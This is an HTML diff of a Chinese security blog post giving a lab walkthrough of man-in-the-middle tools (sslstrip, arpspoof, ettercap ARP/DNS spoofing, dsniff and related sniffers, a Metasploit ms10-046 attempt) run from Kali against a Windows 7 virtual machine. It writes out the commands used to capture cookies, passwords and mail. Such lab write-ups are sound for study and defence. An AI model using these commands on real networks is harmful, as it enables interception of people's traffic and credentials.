@@ -1,0 +1,1289 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="工具," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="spira1" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="最近对中间人攻击很着迷啊，有毒 实验环境：123攻击机：kali	IP：10.211.55.7目标机：Windows 7	IP：10.211.55.4subterfuge 5.0 subterfuge实验步骤：前期准备1.下载并解压工具subterfuge 5.0 2.安装，安装时需注意，选择python_old.py -i（命令行安装），而不是python install.py -i（图形化安装">
+<meta name="keywords" content="工具">
+<meta property="og:type" content="article">
+<meta property="og:title" content="几个常用中间人渗透框架">
+<meta property="og:url" content="http://eagerseven.cn/2018/01/29/几个中间人渗透框架/index.html">
+<meta property="og:site_name" content="spira1">
+<meta property="og:description" content="最近对中间人攻击很着迷啊，有毒 实验环境：123攻击机：kali	IP：10.211.55.7目标机：Windows 7	IP：10.211.55.4subterfuge 5.0 subterfuge实验步骤：前期准备1.下载并解压工具subterfuge 5.0 2.安装，安装时需注意，选择python_old.py -i（命令行安装），而不是python install.py -i（图形化安装">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1fnt2fgn6ogj30qq0ditf1.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcly1fnt2u38r4ij30iy02ot9j.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcly1fnt2z8o4hbj30qm04240h.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1fnt3a6hfslj30re0i8tf8.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcly1fnt3s77mehj30r60i64a8.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fnpvbz33dlj30mg03qdjc.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fnpvi4f3izj30lm03k408.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fnpvt5pgatj309e082dhp.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fnqbg9pwdcj30za0mkdl1.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1fnqcvvii79j30nu0m44hy.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fnqcy0dhjxj30km0ds10k.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fnqd6vhd7vj30r20kw7eb.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcly1fns5rg7owhj30kk05w0tu.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcly1fns5t07ndkj30ke062t9s.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1fns5z19nydj30hq06m74l.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcly1fns68xd1ujj30pw0midol.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcly1fns6cm9owyj30ha07mq3k.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcly1fns7a1ydyxj30ou08kn1c.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcly1fns7fcr01yj30kg060wfk.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcly1fnsnrlagpmj30r60i8k9z.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1fnsnrxk4gaj30j403oq4b.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcly1fnso4kehz8j312a0603zg.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fnqdnqq9pkj30f407u3yx.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1fnqdrd6xgkj30h001ujsr.jpg">
+<meta property="og:updated_time" content="2018-10-31T11:54:03.590Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="几个常用中间人渗透框架">
+<meta name="twitter:description" content="最近对中间人攻击很着迷啊，有毒 实验环境：123攻击机：kali	IP：10.211.55.7目标机：Windows 7	IP：10.211.55.4subterfuge 5.0 subterfuge实验步骤：前期准备1.下载并解压工具subterfuge 5.0 2.安装，安装时需注意，选择python_old.py -i（命令行安装），而不是python install.py -i（图形化安装">
+<meta name="twitter:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1fnt2fgn6ogj30qq0ditf1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eagerseven.cn/2018/01/29/几个中间人渗透框架/"/>
+
+
+
+
+
+  <title>几个常用中间人渗透框架 | spira1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    var trElement = document.getElementById('hexo-helper-live2d');
+    trElement.parentNode.removeChild(trElement);
+    return;
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/hijiki.model.json", 0.5);});
+})();
+</script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">spira1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            Music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eagerseven.cn/2018/01/29/几个中间人渗透框架/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="spira1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="spira1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">几个常用中间人渗透框架</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-29T01:11:00+08:00">
+                2018-01-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1,810
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近对中间人攻击很着迷啊，有毒</p>
+<h3 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机：kali	IP：10.211.55.7</span><br><span class="line">目标机：Windows 7	IP：10.211.55.4</span><br><span class="line">subterfuge 5.0</span><br></pre></td></tr></table></figure>
+<h3 id="subterfuge"><a href="#subterfuge" class="headerlink" title="subterfuge"></a>subterfuge</h3><h4 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h5 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h5><p>1.下载并解压工具subterfuge 5.0</p>
+<p>2.安装，安装时需注意，选择python_old.py -i（命令行安装），而不是python install.py -i（图形化安装），否则会报错</p>
+<p>3.默认安装路径为：/usr/share/subterfuge，执行./sslstrip.py -h 查看参数，会显示权限不够，给权限就OK</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x sslstrip.py</span><br></pre></td></tr></table></figure>
+<p>4.查看参数</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fnt2fgn6ogj30qq0ditf1.jpg" alt=""></p>
+<p>5.开启IP转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@67:/usr/share/subterfuge<span class="comment"># echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</span></span><br></pre></td></tr></table></figure>
+<p>6.用iptables将80端口转发到1234端口，方便sslstrip监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@67:/usr/share/subterfuge<span class="comment"># iptables -t nat -A PREROUTING -p tcp --distination-port 80 -j REDIRECT --to-port 1234</span></span><br></pre></td></tr></table></figure>
+<h5 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h5><p>启动sslstrip开始监听</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fnt2u38r4ij30iy02ot9j.jpg" alt=""></p>
+<p>执行攻击命令</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fnt2z8o4hbj30qm04240h.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-A	开启ascii模式，把捕获的数据以ascii默认显示</span><br><span class="line">-i	选择监听网卡</span><br><span class="line">src 10.211.55.4 and port 80	抓取10.211.55.4的80端口的tcp数据</span><br></pre></td></tr></table></figure>
+<p>在目标机上随便进入一个https的网站就能抓取到所有tcp数据</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fnt3a6hfslj30re0i8tf8.jpg" alt=""></p>
+<p>在目标机上登录QQ邮箱，攻击机上能抓取到cookie等请求头信息</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fnt3s77mehj30r60i64a8.jpg" alt=""></p>
+<h3 id="ARPspoof"><a href="#ARPspoof" class="headerlink" title="ARPspoof"></a>ARPspoof</h3><p>再介绍这个框架之前先了解下ARP协议：</p>
+<p>ARP协议也叫地址解析协议，跟DNS协议类似，只不过ARP协议是用来解析IP和Mac地址的</p>
+<p><strong>工作流程：</strong></p>
+<p>1.根据主机A上的路由表内容，IP确定用于访问主机B的转发IP地址，然后A主机在自己的本地ARP缓存中检查是否匹配B的Mac地址</p>
+<p>2.如果主机A在ARP缓存中没有找到映射，它将访问主机B的硬件地址，从而将包含了A的IP和Mac地址的ARP请求广播到本地网络上的所有主机。</p>
+<p>3.本地的每台主机都能接收到这个ARP请求，并且同时检查是否匹配。如果匹配则将主机A的IP和Mac地址映射添加到本地ARP缓存中，不匹配则丢弃这个ARP请求。</p>
+<p>4.主机B将包含了自身Mac地址的ARP信息回复给A</p>
+<p>5.主机A接收到B的回复消息后，会用B的IP和Mac地址更新ARP缓存，并且建立连接。本机缓存是有生存期道德，生存期结束后缓存会被丢弃，这时候会重复上面的步骤再次建立连接</p>
+<h4 id="实验步骤：-1"><a href="#实验步骤：-1" class="headerlink" title="实验步骤："></a>实验步骤：</h4><p>1.开启IP转发，上面提到过，就不赘述了</p>
+<p>2.查看下参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~<span class="comment"># arpspoof -h</span></span><br><span class="line">Usage: arpspoof [-i interface] [-t target] host</span><br></pre></td></tr></table></figure>
+<p>3.转发受害者的流量到网关：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@67:~<span class="comment"># arpspoof -i eth0 -t 10.211.55.4 10.211.55.1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fnpvbz33dlj30mg03qdjc.jpg" alt=""></p>
+<p>4.转发网关的流量到攻击者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@67:~<span class="comment"># arpspoof -i eth0 -t 10.211.55.1 10.211.55.7</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fnpvi4f3izj30lm03k408.jpg" alt=""></p>
+<p>5.键入命令开始监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@67:~<span class="comment"># driftnet -i eth0</span></span><br></pre></td></tr></table></figure>
+<p>6.在受害机上打开浏览器搜索图片就能看到攻击效果</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fnpvt5pgatj309e082dhp.jpg" alt=""></p>
+<h3 id="Ettercap——ARP中间人攻击"><a href="#Ettercap——ARP中间人攻击" class="headerlink" title="Ettercap——ARP中间人攻击"></a>Ettercap——ARP中间人攻击</h3><p>Ettercap有很多插件，用途很广：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dns_spoof（dns欺骗攻击）</span><br><span class="line">Dos_attack（ddos攻击）</span><br><span class="line">Chk_poison（检测是否进行了攻击）</span><br><span class="line">Repoison_arp（修复arp）</span><br></pre></td></tr></table></figure>
+<p>ettercap包含四种攻击模式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基于IP：根据IP源的目的地过滤数据包</span><br><span class="line">基于Mac：根据Mac地址过滤数据包，能够对嗅探通过网关的连接起作用</span><br><span class="line">基于ARP：利用ARP欺骗方式在两个主机之间的交换式局域网上进行嗅探</span><br><span class="line">基于公共ARP：利用ARP欺骗方式从一台受害者主机到其他所有主机的交换式局域网上进行嗅探</span><br></pre></td></tr></table></figure>
+<p>ettercap还有图形化界面</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fnqbg9pwdcj30za0mkdl1.jpg" alt=""></p>
+<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>1.查看参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@67:~<span class="comment"># ettercap -h</span></span><br></pre></td></tr></table></figure>
+<p>后能看到很多参数，这里选取几个常用的进行了解：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-t 只监听这种协议</span><br><span class="line">-T ettercap检查pcap文件（脱机监听）</span><br><span class="line">-q 不回显</span><br><span class="line">-M 告诉ettercap执行中间人攻击</span><br></pre></td></tr></table></figure>
+<p>2.对目标机进行ARP欺骗：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@67:~<span class="comment"># Ettercap -T -q -M ARP //10.211.55.5/</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fnqcvvii79j30nu0m44hy.jpg" alt=""></p>
+<p>3.然后和上面的arpspoof一样，使用driftnet -i eth0命令来接收劫持的流量</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fnqcy0dhjxj30km0ds10k.jpg" alt=""></p>
+<p>如果想保存劫持到的图片，可以用如下命令：</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fnqd6vhd7vj30r20kw7eb.jpg" alt=""></p>
+<p>不知道是不是因为白天网络更好还是ettercap更好用，这个劫持的速度更快</p>
+<h3 id="Ettercap——DNS中间人攻击："><a href="#Ettercap——DNS中间人攻击：" class="headerlink" title="Ettercap——DNS中间人攻击："></a>Ettercap——DNS中间人攻击：</h3><h4 id="基础演示"><a href="#基础演示" class="headerlink" title="基础演示"></a>基础演示</h4><p>1.打开ettercap GUI（当然也可以使用命令行），点击“Sniff-&gt;unified sniffing”选择网卡</p>
+<p>2.然后点击“hosts-&gt;hosts list”查看子网存活主机</p>
+<p>3.编辑etter.dns，将：</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fns5rg7owhj30kk05w0tu.jpg" alt=""></p>
+<p>修改为另一个网站和自己的ip（因为默认情况下ettercap是重定向到另一个IP，所以需要改变他）：</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fns5t07ndkj30ke062t9s.jpg" alt=""></p>
+<p>4.这是需要启用IP转发：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@67:~<span class="comment"># echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</span></span><br></pre></td></tr></table></figure>
+<p>此时在被攻击机上可以看到DNS是正常解析的（虽然网络大姨妈ping失败）</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fns5z19nydj30hq06m74l.jpg" alt=""></p>
+<p>5.接着回到ettercap GUI上，选择受害者IP地址及Mac地址，点击“Mitm-&gt;ARP poisoning-&gt;Sniff remote connerctions”</p>
+<p>6.然后点击“start-&gt;start sniffing”</p>
+<p>7.选择“plugins-&gt;manage the plugins-&gt;dnsspoof”插件来执行DNS中间人欺骗攻击</p>
+<p>8.通过ettercap启用DNS欺骗攻击</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fns68xd1ujj30pw0midol.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-T 使用文本界面</span><br><span class="line">-q 不回显</span><br><span class="line">-P 使用插件</span><br><span class="line">-M 启动ARP欺骗攻击</span><br></pre></td></tr></table></figure>
+<p>此时在受害者机器上看到，已经攻击成功</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fns6cm9owyj30ha07mq3k.jpg" alt=""></p>
+<h3 id="高级进阶"><a href="#高级进阶" class="headerlink" title="高级进阶"></a>高级进阶</h3><p>我们还可以利用msf来进行进一步攻击</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fns7a1ydyxj30ou08kn1c.jpg" alt=""></p>
+<p>其中设置的ip是攻击机的IP</p>
+<p>然后根据我们的DNS设置etter.dns文件</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fns7fcr01yj30kg060wfk.jpg" alt=""></p>
+<p>但是当用受害机访问目标网站的时候，却不能反弹一个shell，一直不断刷新</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fnsnrlagpmj30r60i8k9z.jpg" alt=""></p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fnsnrxk4gaj30j403oq4b.jpg" alt=""></p>
+<p>因为这是基于ms10-046的快捷方式link文件自动执行代码漏洞，索性我直接将生成的URL直接复制到目标机浏览器</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fnso4kehz8j312a0603zg.jpg" alt=""></p>
+<p>可是出现了和前面一样的情况，一直刷新就是不跳转到共享页面并反弹shell，看来是我的虚拟机已经打了补丁</p>
+<h3 id="Dsniff-amp-ARP欺骗："><a href="#Dsniff-amp-ARP欺骗：" class="headerlink" title="Dsniff&amp;ARP欺骗："></a>Dsniff&amp;ARP欺骗：</h3><p>1.先进行IP转发以及ARP欺骗，同上</p>
+<p>2.然后开启dsniff来捕获已知协议获取密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@67:~<span class="comment"># dsniff -i eth0</span></span><br><span class="line">	dsniff:listening o eth0</span><br></pre></td></tr></table></figure>
+<p>除了dsniff外，还可以用其他工具来进行不同操作</p>
+<p>利用tcpdump捕获相应头</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@67~<span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 10.211.55.4 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4]=0x504f5354)'</span></span><br></pre></td></tr></table></figure>
+<p>利用driftnet捕获图片</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@67~<span class="comment"># driftnet -i eth0</span></span><br></pre></td></tr></table></figure>
+<p>利用urlsnarf捕获http访问记录（抓到的结果会很乱，可以用-v选项指定过滤规则）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@67~<span class="comment"># urlsnarf -i eth0</span></span><br></pre></td></tr></table></figure>
+<p>利用dnsspoof进行dns欺骗，可以用来钓鱼或挂马???</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@67~<span class="comment"># dnsspoof -i eth0 -f /etc/hosts</span></span><br></pre></td></tr></table></figure>
+<p>尝试利用filesnarf抓去往nfs共享目录中保存的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@67~<span class="comment"># filesnarf -i eth0</span></span><br></pre></td></tr></table></figure>
+<p>尝试利用mailsnarf嗅探各类邮件数据，也可以正则匹配输出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@67~<span class="comment"># mailsnarf -i eth0</span></span><br></pre></td></tr></table></figure>
+<p>攻击演示完了，我们也可以分别在攻击机和被攻击机上找到对方的ip地址：</p>
+<p>被攻击的windows 7上：</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fnqdnqq9pkj30f407u3yx.jpg" alt=""></p>
+<p>那个10.211.55.7就是攻击机kali的ip地址</p>
+<p>攻击机kali上：</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fnqdrd6xgkj30h001ujsr.jpg" alt=""></p>
+<p>可以看到10.211.55.4就是被攻击机windows 7的IP地址</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------------这是我的底线-----------------------</div>
+    
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/工具/" rel="tag"><i class="fa fa-tag"></i> 工具</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/24/Meterpreter后渗透总结/" rel="next" title="Meterpreter后渗透总结">
+                <i class="fa fa-chevron-left"></i> Meterpreter后渗透总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/02/03/信息收集/" rel="prev" title="信息收集">
+                信息收集 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
